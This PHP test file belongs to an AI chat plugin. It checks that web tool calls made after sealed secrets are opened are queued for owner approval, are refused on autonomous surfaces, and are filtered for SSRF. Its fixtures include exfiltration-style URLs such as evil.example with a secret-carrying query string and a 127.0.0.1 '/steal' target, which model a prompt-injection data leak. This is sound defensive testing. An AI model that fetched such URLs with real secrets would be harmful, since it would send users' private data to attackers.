<?php
/** @joinery-test
 * name: ai_hot_turn_egress
 * tier: db
 * env: dev-only
 * needs: []
 */
/**
 * The hot-turn web egress rule (specs/ai_hot_turn_egress_approval.md). Once a
 * turn has opened sealed plaintext, a web tool call's arguments may not leave
 * the box without the owner's approval. Covers:
 *
 *  - Classification: web tools are egress only when the process is hot; cold
 *    turns are untouched; egress is not mutation.
 *  - Durable restriction: a conversation that opened sealed content on an
 *    earlier turn gates web egress on every later turn — even a fresh, cold
 *    process — via aic_egress_restricted, without arming the write-guard. This
 *    closes the cold-start gap (a short secret in a standard transcript being
 *    fetched inline next turn).
 *  - Renderers: all three web tools are queueable, and the card carries the
 *    COMPLETE literal outbound argument — wrapped, never truncated.
 *  - A hot chat enqueue of a fetch queues (sealed at rest) and runs nothing —
 *    the injection-exfiltration shape: a URL carrying a smuggled payload
 *    never touches the network before resolution.
 *  - Approve executes the fetch in-request and the event row carries the
 *    fetched text verbatim (past the write path's one-line bound), so the
 *    next turn can reason over it.
 *  - The SSRF validator still fires at execution time: approving a blocked
 *    URL resolves the row failed, nothing fetched.
 *  - The autonomous arm: a surface that cannot queue refuses hot egress with
 *    an error result, before any validator or HTTP client is touched.
 *
 *  - Confinement: sealed content is only opened in a protected chat. A standard
 *    chat's read executor excludes sealed rows (it never goes hot), so the
 *    standard-conversation manifestations of the cold-start and swallowed-event
 *    findings cannot arise; the egress result-carry then only happens on
 *    protected conversations, framed untrusted and windowed at history-build.
 *
 * Run: php tests/run.php db --only=plugins/joinery_ai/tests/ai_hot_turn_egress_test.php
 *
 * @version 1.2
 */
require_once(__DIR__ . '/../../../tests/lib/harness.php');
require_once(__DIR__ . '/../../../tests/lib/vault_fixtures.php');
harness_boot();

require_once(PathHelper::getIncludePath('plugins/joinery_ai/data/ai_conversations_class.php'));
require_once(PathHelper::getIncludePath('plugins/joinery_ai/data/ai_conversation_messages_class.php'));
require_once(PathHelper::getIncludePath('plugins/joinery_ai/data/ai_queued_actions_class.php'));
require_once(PathHelper::getIncludePath('plugins/joinery_ai/includes/ActionQueue.php'));
require_once(PathHelper::getIncludePath('plugins/joinery_ai/includes/AgentLoop.php'));
require_once(PathHelper::getIncludePath('plugins/joinery_ai/includes/ChatTurnContext.php'));
require_once(PathHelper::getIncludePath('plugins/joinery_ai/includes/RiskHeuristic.php'));
require_once(PathHelper::getIncludePath('plugins/joinery_ai/includes/ChatSeal.php'));
require_once(PathHelper::getIncludePath('plugins/joinery_ai/includes/ModelQueryExecutor.php'));
require_once(PathHelper::getIncludePath('plugins/joinery_ai/includes/RecipeToolRegistry.php'));
require_once(PathHelper::getIncludePath('plugins/joinery_ai/includes/QueueableToolInterface.php'));
require_once(PathHelper::getIncludePath('includes/SealedEgressGuard.php'));
require_once(PathHelper::getIncludePath('data/user_encryption_vaults_class.php'));
require_once(PathHelper::getIncludePath('includes/SealedBox.php'));

$db = DbConnector::get_instance()->get_db_link();

$owner = make_user('EgOwner', 10);
$owner_id = intval($owner->key);

$_SESSION['loggedin'] = 1;
$_SESSION['usr_user_id'] = $owner_id;
$_SESSION['permission'] = 10;

$conversation = new AiConversation(NULL);
$conversation->set('aic_owner_user_id', $owner_id);
$conversation->set('aic_title', 'egress test');
$conversation->set('aic_web_search', true);
$conversation->save();
$conversation->load();
harness_register_row('aic_conversations', 'aic_conversation_id', intval($conversation->key));

function eg_register(int $action_id): void {
	harness_register_row('aqa_ai_queued_actions', 'aqa_ai_queued_action_id', $action_id);
}

/** The latest event row's content for a conversation, or ''. */
function eg_latest_event(PDO $db, int $conv_id): string {
	$q = $db->prepare("SELECT aim_content FROM aim_conversation_messages
		WHERE aim_aic_conversation_id = ? AND aim_role = ?
		ORDER BY aim_message_id DESC LIMIT 1");
	$q->execute([$conv_id, AiConversationMessage::ROLE_EVENT]);
	return (string)$q->fetchColumn();
}

/** Reassemble a verbatim-wrapped fact value from its card lines. */
function eg_reassemble(array $lines, string $label): string {
	$value = '';
	foreach ($lines as $line) {
		if (strpos($line, $label . ': ') === 0) {
			$value .= substr($line, strlen($label) + 2);
		} elseif (strpos($line, '↳ ') === 0) {
			$value .= substr($line, strlen('↳ '));
		}
	}
	return $value;
}

// -----------------------------------------------------------------------------
section('Classification: egress is a property of the tool AND the heat');

check(!RiskHeuristic::isHotEgress(['name' => 'fetch_url']),
	'cold: fetch_url flows inline, the rule is dormant');
check(!RiskHeuristic::isHotEgress(['name' => 'web_search'])
		&& !RiskHeuristic::isHotEgress(['name' => 'get_stock_data']),
	'cold: so do the other web tools');
check(!RiskHeuristic::isMutating(['name' => 'fetch_url']),
	'egress is not mutation — a cold fetch is not a write');

SealedEgressGuard::noteScopeOpened($owner_id);
SealedEgressGuard::markHot('ai_hot_turn_egress_test');
check(RiskHeuristic::isHotEgress(['name' => 'fetch_url'])
		&& RiskHeuristic::isHotEgress(['name' => 'web_search'])
		&& RiskHeuristic::isHotEgress(['name' => 'get_stock_data']),
	'hot: all three web tools classify as egress');
check(!RiskHeuristic::isHotEgress(['name' => 'query_model']),
	'hot: a read that sends nothing out stays inline');
SealedEgressGuard::reset();

// The dispatch wiring this classification feeds (pinned, as the queue test
// pins RecipeRunContext::queuesWrites).
$loop_src = file_get_contents(PathHelper::getIncludePath('plugins/joinery_ai/includes/AgentLoop.php'));
check(strpos($loop_src, 'RiskHeuristic::isHotEgress') !== false
		&& strpos($loop_src, 'refuseHotEgress') !== false,
	'AgentLoop routes hot egress to the queue (interactive) or the refusal (autonomous)');

// -----------------------------------------------------------------------------
section('Durable egress restriction: closing the cold-start gap');

SealedEgressGuard::reset();
check(!RiskHeuristic::isHotEgress(['name' => 'fetch_url']),
	'a conversation that never touched sealed content leaves web tools inline');

// A later turn runs in a FRESH (cold) process. Its restriction comes not from
// opening sealed content this turn, but from the durable per-conversation mark
// an earlier turn left — the case the process-hot flag alone cannot see.
SealedEgressGuard::restrictEgress('conv:test');
check(!SealedEgressGuard::isHot()
		&& SealedEgressGuard::isEgressRestricted()
		&& SealedEgressGuard::egressGated(),
	'restrictEgress gates egress without making the process hot');
check(RiskHeuristic::isHotEgress(['name' => 'fetch_url'])
		&& RiskHeuristic::isHotEgress(['name' => 'web_search'])
		&& RiskHeuristic::isHotEgress(['name' => 'get_stock_data']),
	'so the web tools queue on a cold-but-restricted turn — the cold-start gap is closed');
check(!RiskHeuristic::isHotEgress(['name' => 'query_model']),
	'a read that sends nothing out still flows inline under restriction');

// The crux of the design: arming egress restriction must NOT arm the write-guard,
// or a standard conversation could no longer write its own turn. While restricted
// but cold, a long plaintext write is allowed.
$threw = false;
try {
	SealedEgressGuard::assertStatementAllowed(
		'UPDATE aic_conversations SET aic_title = ? WHERE aic_conversation_id = ?',
		[str_repeat('x', 200), 1]);
} catch (Throwable $e) { $threw = true; }
check(!$threw,
	'a long plaintext write is not refused when only egress-restricted (write-guard untouched)');

SealedEgressGuard::reset();
check(!SealedEgressGuard::isEgressRestricted()
		&& !RiskHeuristic::isHotEgress(['name' => 'fetch_url']),
	'reset returns the process to unrestricted');

// The durable flag round-trips on the conversation, and ChatRunner wires it:
// it arms restriction from the flag before the turn and persists the flag after
// a turn that opened sealed content.
AiConversation::updateColumns((int)$conversation->key, ['aic_egress_restricted' => true]);
$conversation->load();
check((bool)$conversation->get('aic_egress_restricted') === true,
	'aic_egress_restricted round-trips on the conversation row');
$runner_src = file_get_contents(PathHelper::getIncludePath('plugins/joinery_ai/includes/ChatRunner.php'));
check(strpos($runner_src, "get('aic_egress_restricted')") !== false
		&& strpos($runner_src, 'restrictEgress') !== false
		&& strpos($runner_src, "'aic_egress_restricted' => true") !== false,
	'ChatRunner arms restriction from the flag and persists it when the turn goes hot');
// Clear it so it does not perturb the enqueue/approve fixtures below.
AiConversation::updateColumns((int)$conversation->key, ['aic_egress_restricted' => false]);
$conversation->load();

// -----------------------------------------------------------------------------
section('Sealed reads are confined to protected chats');

$std_ctx = new ChatTurnContext($conversation, $owner_id);
check(!$std_ctx->sealedReadsAllowed(),
	'a standard chat may not open sealed content');
$conversation->set('aic_security_level', ChatSeal::LEVEL_PRIVATE);   // in-memory flip for the predicate
$prot_ctx = new ChatTurnContext($conversation, $owner_id);
check($prot_ctx->sealedReadsAllowed(),
	'a protected chat may');
$conversation->set('aic_security_level', ChatSeal::LEVEL_STANDARD);

// The read executor excludes actually-sealed rows when the surface may not open
// them — the same exclusion a locked vault triggers — so a standard turn never
// decrypts (never goes hot), yet still reads ordinary plaintext fields.
$decrypt = new ReflectionMethod('ModelQueryExecutor', 'decryptSealedFields');
$decrypt->setAccessible(true);
$sealed_row = ['aim_message_id' => 1, 'aim_content' => 'v1.aead.' . str_repeat('x', 40),
	'aim_content_sealed' => true, 'aim_sealed_owner_user_id' => $owner_id, 'aim_sealed_key' => 'k'];
$plain_row  = ['aim_message_id' => 2, 'aim_content' => 'ordinary plaintext', 'aim_content_sealed' => false];
$kept = $decrypt->invoke(null, [$sealed_row, $plain_row], 'AiConversationMessage', false);
check(count($kept) === 1 && (int)($kept[0]['aim_message_id'] ?? 0) === 2
		&& ModelQueryExecutor::lastLockedExcluded() === 1,
	'the sealed row is excluded, the plaintext row still read', json_encode(array_column($kept, 'aim_message_id')));

// Recipes are the protected unit themselves, so they may open sealed content.
$exec_src = file_get_contents(PathHelper::getIncludePath('plugins/joinery_ai/includes/ModelQueryExecutor.php'));
check(strpos($exec_src, 'sealedReadsAllowed()') !== false,
	'the read executor gates decryption on the surface being allowed to open sealed content');

// -----------------------------------------------------------------------------
section('Renderers: the card shows the complete outbound argument');

foreach (['fetch_url', 'web_search', 'get_stock_data'] as $tool_name) {
	check(RecipeToolRegistry::get($tool_name) instanceof QueueableToolInterface,
		"$tool_name renders its own card");
}

$long_url = 'https://example.com/track?payload=' . str_repeat('x', 350) . '&end=tail';
$facts = RecipeToolRegistry::get('fetch_url')->renderProposedAction(['url' => $long_url]);
check(stripos($facts[0], 'example.com') !== false,
	'the headline leads with the host', $facts[0]);
check(eg_reassemble($facts, 'URL') === $long_url,
	'the full URL survives wrapping — every character on the card, nothing in a cut-off tail');
$over = array_filter($facts, fn($l) => mb_strlen($l) > ActionQueue::FACT_LINE_MAX);
check($over === [],
	'and no wrapped line exceeds the card bound, so the card layer truncates nothing');

$q_facts = RecipeToolRegistry::get('web_search')->renderProposedAction(
	['query' => 'who is the CEO of Initech']);
check(eg_reassemble($q_facts, 'Query') === 'who is the CEO of Initech',
	'a search card carries the literal query', json_encode($q_facts));

// -----------------------------------------------------------------------------
section('Approve executes the fetch; the event row carries the text verbatim');

$fetch = ActionQueue::enqueue($owner_id, 'fetch_url',
	['url' => 'https://dev.getjoinery.com/'], intval($conversation->key));
eg_register((int)$fetch->key);
check((string)$fetch->get('aqa_status') === AiQueuedAction::STATUS_PENDING
		&& (string)$fetch->get('aqa_result') === '',
	'the queued fetch waits — no result before resolution');

$resolved = ActionQueue::resolve((int)$fetch->key, $owner_id, 'approve');
check((string)$resolved->get('aqa_status') === AiQueuedAction::STATUS_APPROVED,
	'approve executed the fetch in-request',
	(string)$resolved->get('aqa_status') . ' / ' . (string)$resolved->get('aqa_result'));

$event = eg_latest_event($db, intval($conversation->key));
check(strpos($event, 'Source: https://dev.getjoinery.com') !== false,
	'the event row carries the fetched content', mb_substr($event, 0, 120));
check(mb_strlen($event) > 500,
	'verbatim, past the write path\'s one-line bound — the next turn can reason over it',
	'event length ' . mb_strlen($event));
check(strpos($event, 'fetched result') !== false,
	'the carried result rides after the separator so history-build can frame + window it');

$card = ActionQueue::card($resolved);
check($card['result'] !== null && mb_strlen($card['result']) <= 500,
	'while the card keeps a bounded preview');

// -----------------------------------------------------------------------------
section('The SSRF validator fires at execution, not enqueue');

$blocked = ActionQueue::enqueue($owner_id, 'fetch_url',
	['url' => 'http://127.0.0.1/steal'], intval($conversation->key));
eg_register((int)$blocked->key);
check((string)$blocked->get('aqa_status') === AiQueuedAction::STATUS_PENDING,
	'a blocked-host URL can still be proposed — refusal is the executor\'s job');

$resolved = ActionQueue::resolve((int)$blocked->key, $owner_id, 'approve');
check((string)$resolved->get('aqa_status') === AiQueuedAction::STATUS_FAILED,
	'approving it fails the row — the validator answered at execution time');
check(stripos((string)$resolved->get('aqa_result'), 'blocked') !== false,
	'with the block named in the result', (string)$resolved->get('aqa_result'));

// -----------------------------------------------------------------------------
section('Hot chat turn: the injection shape queues sealed and touches no network');

$kp = sodium_crypto_box_keypair();
$vault = new UserEncryptionVault(NULL);
$vault->set('uev_usr_user_id', $owner_id);
$vault->set('uev_public_key', SealedBox::b64url(sodium_crypto_box_publickey($kp)));
$vault->set('uev_salt', SealedBox::b64url(random_bytes(16)));
$vault->save();
$vault->load();
harness_register_row('uev_user_encryption_vaults', 'uev_user_encryption_vault_id', intval($vault->key));

SealedEgressGuard::noteScopeOpened($owner_id);
SealedEgressGuard::markHot('ai_hot_turn_egress_test');

$chat_ctx = new ChatTurnContext($conversation, $owner_id);
$exfil_url = 'https://evil.example/?d=' . str_repeat('s3cr3t', 40);
$block = $chat_ctx->enqueueProposedAction([
	'type' => 'tool_use', 'id' => 'toolu_eg_1', 'name' => 'fetch_url',
	'input' => ['url' => $exfil_url],
]);
check(empty($block['is_error']) && stripos((string)$block['content'], 'Queued for approval') !== false,
	'the hot fetch queues — the model gets a queued result, not page content', json_encode($block));

preg_match('/#(\d+)/', (string)$block['content'], $m);
$hot_action_id = (int)($m[1] ?? 0);
eg_register($hot_action_id);
$raw = $db->prepare("SELECT aqa_status, aqa_result, aqa_arguments, aqa_content_sealed
	FROM aqa_ai_queued_actions WHERE aqa_ai_queued_action_id = ?");
$raw->execute([$hot_action_id]);
$row = $raw->fetch(PDO::FETCH_ASSOC);
check(($row['aqa_status'] ?? '') === AiQueuedAction::STATUS_PENDING
		&& (string)($row['aqa_result'] ?? '') === '',
	'nothing executed — the smuggled payload never reached a validator or socket');
check(!empty($row['aqa_content_sealed']) && $row['aqa_content_sealed'] !== 'f'
		&& strpos((string)$row['aqa_arguments'], 'v1.aead.') === 0,
	'and the proposal (URL included) is sealed to the owner at rest',
	substr((string)$row['aqa_arguments'], 0, 24));

SealedEgressGuard::reset();

// -----------------------------------------------------------------------------
section('The autonomous arm: no approver, no egress');

$stub_ctx = new class implements ToolContext {
	public array $entries = [];
	public function actingUserId(): int { return 0; }
	public function ownerTimezone(): string { return 'UTC'; }
	public function untrustedNonce(): string { return 'stub'; }
	public function allowedModels(): array { return []; }
	public function allowedActions(): array { return []; }
	public function queuesWrites(): bool { return false; }
	public function enqueueProposedAction(array $tool_use): array {
		throw new LogicException('autonomous surfaces never queue');
	}
	public function ownerScopedReads(): bool { return true; }
	public function sealedReadsAllowed(): bool { return false; }
	public function shouldContinue(): ?array { return null; }
	public function shouldAbort(): bool { return false; }
	// Model the real contexts: begin records a started entry, finish reconciles
	// it by (name, started_time). The refusal audits through this lifecycle, so
	// its durable persistence is what the assertion below checks.
	public function beginToolCall(array $entry): void { $this->entries[] = $entry; }
	public function finishToolCall(array $entry): void {
		foreach ($this->entries as $i => $e) {
			if (($e['name'] ?? '') === ($entry['name'] ?? '')
					&& ($e['started_time'] ?? '') === ($entry['started_time'] ?? '')) {
				$this->entries[$i] = $entry;
				return;
			}
		}
		$this->entries[] = $entry;
	}
	public function appendToolCall(array $entry): void { $this->entries[] = $entry; }
	public function emitText(string $delta): void {}
	public function noteActivity(string $label): void {}
};

$refuse = new ReflectionMethod('AgentLoop', 'refuseHotEgress');
$refuse->setAccessible(true);
$block = $refuse->invoke(null,
	['type' => 'tool_use', 'id' => 'toolu_eg_2', 'name' => 'fetch_url',
	 'input' => ['url' => 'https://evil.example/?d=leak']],
	$stub_ctx);
check(!empty($block['is_error'])
		&& stripos((string)$block['content'], 'hot-turn egress') !== false,
	'the refusal is an error result naming the rule', (string)$block['content']);
check(count($stub_ctx->entries) === 1 && !empty($stub_ctx->entries[0]['is_error']),
	'and it lands in the audit trail like any other call outcome');

harness_finish();
